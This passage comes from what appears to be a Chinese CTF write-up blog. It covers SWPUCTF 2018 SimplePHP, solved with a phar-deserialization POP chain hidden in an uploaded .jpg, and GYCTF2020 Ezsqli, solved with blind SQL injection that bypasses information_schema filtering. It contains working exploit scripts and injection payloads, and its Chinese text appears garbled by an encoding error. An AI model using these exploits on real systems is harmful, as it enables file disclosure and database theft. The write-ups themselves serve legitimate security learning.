class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line">header(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $filename = md5($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].$_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">&quot;upload/&quot;</span> . $filename)) &#123; </span><br><span class="line">        unlink($filename); </span><br><span class="line">    &#125; </span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . $filename); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    <span class="keyword">if</span>(upload_file_check()) &#123; </span><br><span class="line">        upload_file_do(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $allowed_types = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    $temp = explode(<span class="string">&quot;.&quot;</span>,$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    $extension = end($temp); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(in_array($extension,$allowed_types)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>class.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params">$key,$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--flag is in f1ag.php--&gt;</span><br></pre></td></tr></table></figure>

<p>ååºåˆ—åŒ–ï¼Œä½†æ˜¯æ²¡æœ‰ååºåˆ—åŒ–åˆ©ç”¨ç‚¹â€¦â€¦</p>
<h3><span id="pharååºåˆ—åŒ–">pharååºåˆ—åŒ–</span></h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/13030571.html">https://www.cnblogs.com/zzjdbk/p/13030571.html</a></p>
<p>ç»“åˆæ–‡ä»¶ä¸Šä¼ ä¸­çš„æ–‡ä»¶æ“ä½œå‡½æ•°ï¼Œå¯ä»¥åˆ©ç”¨pharä¸­ä»¥ååºåˆ—åŒ–æ–¹å¼å‚¨å­˜çš„meta-dataè¿›è¡Œååºåˆ—åŒ–ã€‚åœ¨æ–‡ä»¶æ“ä½œå‡½æ•°è¿›è¡Œpharè§£ææ—¶ï¼Œmeta-dataçš„æ•°æ®ä¹Ÿä¼šä¸€åŒè§£æã€‚</p>
<p>å¼€å§‹æ‰¾popé“¾ï¼š</p>
<p>å…ˆæ‰¾é­”æ³•æ–¹æ³•â€¦â€¦__destruct()ã€__wakeup()ã€__toString()â€¦â€¦</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)//ææ„ï¼Œè„šæœ¬ç»“æŸè‡ªåŠ¨è°ƒç”¨</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;<span class="comment">//toString</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;<span class="comment">//å±æ€§è°ƒç”¨-ã€‹get</span></span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ€åæ¥åˆ°file_get_contentsè¿›è¡Œæ–‡ä»¶è¯»å–</p>
<p>æ„å»ºè„šæœ¬ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> C1e4r();</span><br><span class="line">$b = <span class="keyword">new</span> Show();</span><br><span class="line">$c = <span class="keyword">new</span> Test();</span><br><span class="line"></span><br><span class="line">$c-&gt;params[<span class="string">&#x27;source&#x27;</span>] = <span class="string">&quot;/var/www/html/f1ag.php&quot;</span>;</span><br><span class="line">$b-&gt;str[<span class="string">&#x27;str&#x27;</span>] = $c;</span><br><span class="line">$a-&gt;str = $b;</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//åˆ›å»º.pharæ–‡ä»¶</span></span><br><span class="line">$phar-&gt;startBuffering();<span class="comment">//å†™å…¥ç¼“å†²</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="comment">//å›ºå®š</span></span><br><span class="line">$phar-&gt;setMetadata($a); <span class="comment">//ä¼ å…¥C1e4rå¯¹è±¡</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//ç”Ÿæˆç­¾å</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>éœ€è¦ä¿®æ”¹php.iniä¸­çš„phar.readonlyï¼Œä¸”ä¸€å®šè¦å»æ‰å‰é¢çš„åˆ†å·ï¼â€¦â€¦</p>
</blockquote>
<p>ä¸Šä¼ æ–‡ä»¶åï¼š$filename = md5($_FILES[â€œfileâ€][â€œnameâ€].$_SERVER[â€œREMOTE_ADDRâ€]).â€.jpgâ€;</p>
<p>move_uploaded_file($_FILES[â€œfileâ€][â€œtmp_nameâ€],â€upload/â€œ . $filename); è½¬ç§»åˆ°æŒ‡å®šçš„uploadç›®å½•</p>
<p>ç”Ÿæˆpharåæ”¹åç¼€ä¸ºjpgï¼Œä¸Šä¼ </p>
<img src="/images/SWPUCTF-2018-SimplePHP/image-20210504164131263.png" alt="image-20210504164131263" style="zoom:80%;">

<p>ç”¨pharåè®®å»è¯»å–ï¼š</p>
<p>phar://upload/febdf38ac03e62cb8f05d46cefefd732.jpg</p>
<p><img src="/images/SWPUCTF-2018-SimplePHP/image-20210504164935877.png" alt="image-20210504164935877"></p>
<blockquote>
<?php 
    //$a = 'flag{e89a6b68-6755-4537-85ec-b9f47eb51ab3}';
 ?>
</blockquote>
<p>å¾—åˆ°flagâ€¦â€¦</p>
</div><div class="index-category-tag">Â Â <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus">Â </i>2021-05-04Â Â <a class="commentCountImg" href="/2021/05/04/GYCTF2020-Ezsqli/#comment-container"><span class="display-none-class">/2021/05/04/GYCTF2020-Ezsqli/</span><i class="far fa-comment-dots"></i>Â <span class="commentCount" id="eb221418d090b41259604dfeeb93e4bc">99+</span>Â Â </a><span class="level-item"><i class="far fa-clock">Â </i>3 åˆ†é’Ÿ Â <i class="fas fa-pencil-alt">Â </i>0.5Â k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/05/04/GYCTF2020-Ezsqli/">GYCTF2020-Ezsqli</a></h1><div class="content"><h3><span id="gyctf2020ezsqli">[GYCTF2020]Ezsqli</span></h3><p>idæ˜¯æ³¨å…¥ç‚¹ï¼Œ4/2å‘ç°æ˜¯æ•°å€¼å‹æ³¨å…¥â€¦â€¦æµ‹è¯•ä¸‹ï¼š</p>
<img src="/images/GYCTF2020-Ezsqli/image-20210504093103645.png" alt="image-20210504093103645" style="zoom:80%;">

<p>informationéƒ½è¢«è¿‡æ»¤äº†â€¦â€¦è¿™é‡Œå¿…é¡»è¦ç»•è¿‡è¿™ä¸ªè¿‡æ»¤</p>
<h3><span id="information_schemaç»•è¿‡">information_schemaç»•è¿‡</span></h3><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193512">èŠä¸€èŠbypass information_schema</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_49835838/article/details/109159839">mysqlæ³¨å…¥ç»•è¿‡information_schemaè¿‡æ»¤</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4a084ea1c7d4">information_schemaä»£æ›¿æ–¹æ³•</a></p>
<h4><span id="sysschema_table_statistics_with_buffer">sys.schema_table_statistics_with_buffer</span></h4><p>SELECT * from sys.schema_table_statistics_with_buffer</p>
<table>
<thead>
<tr>
<th align="left">table_schema</th>
<th align="left">table_name</th>
<th align="right">rows_fetched</th>
<th align="left">fetch_latency</th>
<th align="right">rows_inserted</th>
<th align="left">insert_latency</th>
<th align="right">rows_updated</th>
<th align="left">update_latency</th>
<th align="right">rows_deleted</th>
<th align="left">delete_latency</th>
<th align="right">io_read_requests</th>
<th align="left">io_read</th>
<th align="left">io_read_latency</th>
<th align="right">io_write_requests</th>
<th align="left">io_write</th>
<th align="left">io_write_latency</th>
<th align="right">io_misc_requests</th>
<th align="left">io_misc_latency</th>
<th align="left">innodb_buffer_allocated</th>
<th align="left">innodb_buffer_data</th>
<th align="left">innodb_buffer_free</th>
<th align="right">innodb_buffer_pages</th>
<th align="right">innodb_buffer_pages_hashed</th>
<th align="right">innodb_buffer_pages_old</th>
<th align="right">innodb_buffer_rows_cached</th>
</tr>
</thead>
<tbody><tr>
<td align="left"></td>
<td align="left"></td>
<td align="right"></td>
<td align="left"></td>
<td align="right"></td>
<td align="left"></td>
<td align="right"></td>
<td align="left"></td>
<td align="right"></td>
<td align="left"></td>
<td align="right"></td>
<td align="left"></td>
<td align="left"></td>
<td align="right"></td>
<td align="left"></td>
<td align="left"></td>
<td align="right"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="right"></td>
<td align="right"></td>
<td align="right"></td>
<td align="right"></td>
</tr>
</tbody></table>
<p>å¯ä»¥çœ‹åˆ°æœ‰table_schemaå’Œtable_nameï¼Œå€Ÿæ­¤å¯ä»¥è·å¾—è¡¨åï¼š</p>
<img src="/images/GYCTF2020-Ezsqli/image-20210504101705740.png" alt="image-20210504101705740" style="zoom:80%;">

<p>ä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰åˆ—åï¼Œè¿™é‡Œéœ€è¦</p>
<h3><span id="æ— åˆ—åæ³¨å…¥">æ— åˆ—åæ³¨å…¥</span></h3><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4a084ea1c7d4">https://www.jianshu.com/p/4a084ea1c7d4</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/98206699">https://zhuanlan.zhihu.com/p/98206699</a></p>
<p>è¿ç”¨åˆ°sqlæ¯”è¾ƒå­—ç¬¦ä¸²çš„ç‰¹æ€§ï¼Œå½“ä¸¤ä¸ªå­—ç¬¦ä¸²åšæ¯”è¾ƒè¿ç®—æ—¶ï¼Œä¼šå…ˆæ¯”è¾ƒé¦–ä½å­—ç¬¦ï¼Œè‹¥é¦–ä½ç›¸åŒï¼Œåˆ™æ¯”è¾ƒç¬¬äºŒä½â€¦â€¦</p>
<blockquote>
<p>id=2||((select 1,â€gâ€)&gt;(select * from f1ag_1s_h3r3_hhhhh))#</p>
<p>ä¸¤è¾¹æŸ¥è¯¢çš„åˆ—æ•°è¦ç›¸åŒ</p>
</blockquote>
<p>æ‹é¡ºé€»è¾‘ç”¨äºŒåˆ†æ³•å†™è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://bec2be36-f01b-4b15-bc93-dc44e0b9fbb6.node3.buuoj.cn/&quot;</span></span><br><span class="line"></span><br><span class="line">data1 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># åº“å</span></span><br><span class="line">data2 = <span class="string">&quot;2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;&#125;,1))&gt;=&#123;&#125;#&quot;</span></span><br><span class="line"><span class="comment"># è¡¨å</span></span><br><span class="line">data3 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># åˆ—å</span></span><br><span class="line">data4 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># æ•°æ®</span></span><br><span class="line">data5 = <span class="string">&quot;2||((select 1,&#x27;&#123;&#125;&#x27;)&lt;=(select * from f1ag_1s_h3r3_hhhhh))#&quot;</span></span><br><span class="line"><span class="comment"># å­—ç¬¦ä¸²ç§»ä½æ¯”è¾ƒ+æ— åˆ—å</span></span><br><span class="line">data = data5</span><br><span class="line"><span class="comment"># é€‰æ‹©postæ•°æ®</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> r &gt; l:</span><br><span class="line">        mid = <span class="built_in">int</span>((l + r + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        x = <span class="built_in">str</span>(x)</span><br><span class="line">        y = <span class="built_in">str</span>(mid)</span><br><span class="line">        <span class="keyword">if</span> data != data5:</span><br><span class="line">            pay = &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>: data.<span class="built_in">format</span>(x, y)</span><br><span class="line">                   &#125;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pay = &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>: data.<span class="built_in">format</span>(flag+<span class="built_in">chr</span>(<span class="built_in">int</span>(y)))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># print(pay)</span></span><br><span class="line">        <span class="comment"># è¿™é‡Œéœ€æ›´æ”¹æ³¨å…¥ç‚¹</span></span><br><span class="line">        response = requests.post(url=url, data=pay)</span><br><span class="line">        <span class="comment"># 